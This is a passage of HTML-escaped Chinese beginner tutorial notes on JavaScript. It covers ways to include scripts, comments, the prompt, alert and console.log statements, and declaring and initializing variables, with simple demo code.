    	&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- 1. 行内式的js 直接写到元素的内部 --&amp;gt;&lt;/span&gt;
    	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;唐伯虎&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alert(&amp;#39;秋香姐&amp;#39;)&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;如果我是JD，你还爱我吗？&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2171-行内式-js&#34;&gt;2.1.7.1 行内式 JS&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;点我试试&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alert(&amp;#39;Hello World&amp;#39;)&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;可以将单行或少量JS带u吗写在HTML标签的事件属性种（以on开头的属性），如：onclick&lt;/li&gt;
&lt;li&gt;注意单双引号的实用：在HTML种我们推荐使用双引号，JS种我们推荐使用单引号&lt;/li&gt;
&lt;li&gt;可读性差，在html种编写JS大量代码时，不方便阅读&lt;/li&gt;
&lt;li&gt;引号易错，引号多层嵌套匹配时，非常容易弄混&lt;/li&gt;
&lt;li&gt;特殊情况下使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2172-内嵌-js&#34;&gt;2.1.7.2 内嵌 JS&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hello World~!&amp;#39;&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;可以将多行JS代码写到&lt;code&gt;&amp;lt;scrip&amp;gt;&lt;/code&gt;标签种&lt;/li&gt;
&lt;li&gt;内嵌JS是学习时常用的方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2173-外部js文件&#34;&gt;2.1.7.3 外部JS文件&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;my.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;利于HTML页面代码结构化，把大段JS代码独立到HTML页面外，既美观，也方便文件级别的复用&lt;/li&gt;
&lt;li&gt;引用外部JS文件的script标签中间不可以写代码&lt;/li&gt;
&lt;li&gt;适合于JS代码量比较大的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;22-javascript-注释&#34;&gt;2.2 JavaScript 注释&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 单行注释	ctrl + /
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;               2. 多行注释 默认的快捷键 shift + alt + a
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;                         修改的快捷键 vscode 中修改多行注释的快捷键：ctrl + shift + /
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;            */&lt;/span&gt;
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;23-javascript-输入输出语句&#34;&gt;2.3 JavaScript 输入输出语句&lt;/h2&gt;
&lt;p&gt;为了方便信息的输入输出，JS中提供了一些输入输出语句，其常用的语句如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200504004630.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        	&lt;span style=&#34;color:#75715e&#34;&gt;// 这是一个输入框
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入您的年龄&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// alert 弹出警示框 输出的 展示给用户的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;计算的结果是&amp;#39;&lt;/span&gt;);
			&lt;span style=&#34;color:#75715e&#34;&gt;// console 控制台输出 给程序员测试用的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我是程序员能看到的&amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;3-变量&#34;&gt;3. 变量&lt;/h1&gt;
&lt;h2 id=&#34;本节目标&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够说出变量的主要作用&lt;/li&gt;
&lt;li&gt;能够写出变量的初始化&lt;/li&gt;
&lt;li&gt;能够说出变量的命名规范&lt;/li&gt;
&lt;li&gt;能够画出变量是如何在内存中存储的&lt;/li&gt;
&lt;li&gt;能够写出交换变量案例&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本节目录&#34;&gt;本节目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;变量概述&lt;/li&gt;
&lt;li&gt;变量的使用&lt;/li&gt;
&lt;li&gt;变量语法扩展&lt;/li&gt;
&lt;li&gt;变量命名规范&lt;/li&gt;
&lt;li&gt;交换变量案例&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;31-变量概述&#34;&gt;3.1 变量概述&lt;/h2&gt;
&lt;h3 id=&#34;311-什么是变量&#34;&gt;3.1.1 什么是变量&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;白话：变量就是一个装东西的盒子&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通俗：变量是用于存放数据的容器。我们通过变量名获取数据，甚至数据可以修改。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200504005436.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;312-变量是在内存中的存储&#34;&gt;3.1.2 变量是在内存中的存储&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;本质：变量是程序在内存中申请的一块用来存放数据的空间&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;类似于我们酒店的房间，一个房间就可以看做是一个变量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200504005925.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;32-变量的使用&#34;&gt;3.2 变量的使用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;变量在使用时分两步：
&lt;ul&gt;
&lt;li&gt;声明变量&lt;/li&gt;
&lt;li&gt;赋值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;321-声明变量&#34;&gt;3.2.1 声明变量&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 声明变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 声明一个名称为 age 的变量
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;==&lt;code&gt;var&lt;/code&gt; 是一个 JS 关键字==，用来声明变量（variable变量的意思）。使用该关键字声明变量后，计算机会自动为变量分配内存空间，不需要程序员管。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;age&lt;/code&gt; 是程序员定义的变量名，我们要通过变量名来访问内存中分配的空间。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;322-赋值&#34;&gt;3.2.2 赋值&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 给 age 这个变量赋值为 10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt; 用来把右边的值赋给左边的变量空间中，此处代表赋值的意思&lt;/li&gt;
&lt;li&gt;变量值是程序员保存到变量空间里的值&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;323-变量的初始化&#34;&gt;3.2.3 变量的初始化&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 声明变量同时赋值为18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;声明一个变量并赋值，我们称之为变量的初始化。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明了一个age的变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 赋值 把值存入这个变量中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 控制台输出结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 变量的初始化
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例变量的使用1&#34;&gt;案例：变量的使用1&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200504012755.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;旗木卡卡西&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;火影村&amp;#39;&lt;/span&gt;;
